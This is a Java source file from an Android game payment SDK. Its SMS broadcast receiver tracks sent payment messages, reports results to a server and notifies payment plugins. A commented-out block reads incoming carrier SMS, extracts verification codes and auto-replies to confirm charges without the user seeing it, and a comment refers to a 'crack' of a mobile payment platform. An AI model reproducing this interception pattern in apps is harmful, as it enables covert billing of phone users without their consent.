package mobi.zty.sdk.game;

//mobi.zty.sdk.game.SMSReceiver
import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Message;
import android.telephony.SmsManager;

/**
 * 目前该类只负责 监听短信是否发送成功
 * @author Administrator
 *
 */
public final class SMSReceiver extends BroadcastReceiver
{
  public SMSReceiver()
  {
  }

  
  
  public final void onReceive(Context context, Intent intent)
  {
	  if (intent.getAction()
              .equals("android.provider.Telephony.SMS_RECEIVED"))
	  {
//		  Util_G.debugE("ALLPAY", "onReceive sms");
//		  Object[] pdus = (Object[])intent.getExtras().get("pdus");//获取短信内容
//		      for(Object pdu : pdus)
//		      {
//		          byte[] data = (byte[]) pdu;//获取单条短信内容，短信内容以pdu格式存在
//		          SmsMessage message = SmsMessage.createFromPdu(data);//使用pdu格式的短信数据生成短信对象
//		          String sender = message.getOriginatingAddress();//获取短信的发送者lsl
//		          String content = message.getMessageBody();//获取短信的内容
//		          if (sender.contains("10658899")) {
//		        	  if (GameSDK.getInstance().getMk(GameSDK.getInstance().repeatPayIndex).equals(Constants.YEYOU_FEE)) {//如果是页游要读取短信
//		        		  int startIndex = -1;
//		        		  int endIndex =1;
//		        		  String munber = "0123456789";
//		        		  for (int i = 0; i < content.length(); i++) {
//		        			  String cr = content.charAt(i)+"";
//		        			  if (startIndex<0&&munber.contains(cr)) {
//		        				  startIndex = i;
//		        			  }else if(startIndex>=0&&!munber.contains(cr)){
//		        				  endIndex = i;
//		        				  break;
//		        			  }
//		        		  }
//			        	  GameSDK.vetif_vode = content.substring(startIndex, endIndex);
//			        	  break;
//			          }
//		          }else{
//		        	  if (GameSDK.getInstance().getMk(GameSDK.getInstance().repeatPayIndex).equals(Constants.DONGFENG_PAY)) {//如果是页游要读取短信
//		        		  Intent itSend = new Intent(GameSDK.SENT_SMS_ACTION);  
//		        		  Constants.notifyByMsgmap.put(Constants.DONGFENG_PAY, true);
//		        	       PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
//		        	       Util_G.sendTextMessage(context, sender, "1", mSendPI, 0);
//			        	  break;
//			          }
//		          }
//		       }
	  }
	  else if(intent.getAction()
              .equals("SENT_SMS_ACTION"))
	  {
			synchronized (intent) {
				Integer feeIndex = intent.getIntExtra("fee_index", 0);

				int ret = getResultCode();
				PayResultInfo info = new PayResultInfo();
				info.index = feeIndex;
				GameSDK instance = GameSDK.getInstance();
				if (instance == null)
					return;
				GroupFeeInfo groupFeeInfo = instance.getCurgGroupFeeInfo();
				if (groupFeeInfo == null)
					Util_G.debugE("AllPay", "error 未取到当前计费点组合！");
				if (!groupFeeInfo.intdexMkMap.containsKey(feeIndex))
					Util_G.debugE("AllPay", "error 初始化时未保存对应计费点的支付类型！");
				Integer mk = groupFeeInfo.intdexMkMap.get(feeIndex);
				switch (ret) {
				case Activity.RESULT_OK:
					// 支付成功
					if (groupFeeInfo.getIntdexVerifyMap().get(feeIndex) == 0) {
						groupFeeInfo.getIntdexVerifyMap().put(feeIndex, 1);
						Helper.sendPayMessageToServer(mk, "请求验证码的短信已经发出！", feeIndex);
						Util_G.debugE("AllPay", "请求验证码的短信已经发出！");
					} else {//(groupFeeInfo.getIntdexVerifyMap().get(feeIndex) == 2)
						Util_G.debugE("AllPay", "支付成功的短信发出！");
						Helper.sendPayMessageToServer(mk, "支付成功的短信发出！", feeIndex);
						if (GameSDK.getInstance().mkMap.containsKey(mk)) {
							try {// 移动MM安安破解
								PaymentFactoy.producePay(GameSDK.getInstance().mkMap.get(mk).mkClassName,GameSDK.getInstance().context)
										.notifyPay(1,feeIndex);
							} catch (Throwable e) {
								e.printStackTrace();
							}
						}
						if (instance.bCallback == 0) {
							Util_G.debugE("Allpay", "mkSucc=" + mk + " index ="
									+ feeIndex);
							info.resutCode = PayConfig.BIIL_SUCC;
							info.retMsg = "支付成功！";
							Message message = instance.payResultHandle
									.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
						}
					}
					break;
				case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
				case SmsManager.RESULT_ERROR_RADIO_OFF:
				case SmsManager.RESULT_ERROR_NULL_PDU:
				default:
					if (GameSDK.getInstance().payIdMap.containsKey(mk)) {
						try {// 移动MM安安破解
							PaymentFactoy.producePay(GameSDK.getInstance().payIdMap.get(mk).mkClassName,GameSDK.getInstance().context)
									.notifyPay(0,feeIndex);
						} catch (Throwable e) {
							e.printStackTrace();
						}
					}
					info.resutCode = PayConfig.SEND_MSG_FAIL;
					info.retMsg = "短信发送失败：";
					Message message = instance.payResultHandle
							.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					Helper.sendPayMessageToServer(mk, info.retMsg , feeIndex);
					break;
				}
			}

      }
  }

  
}

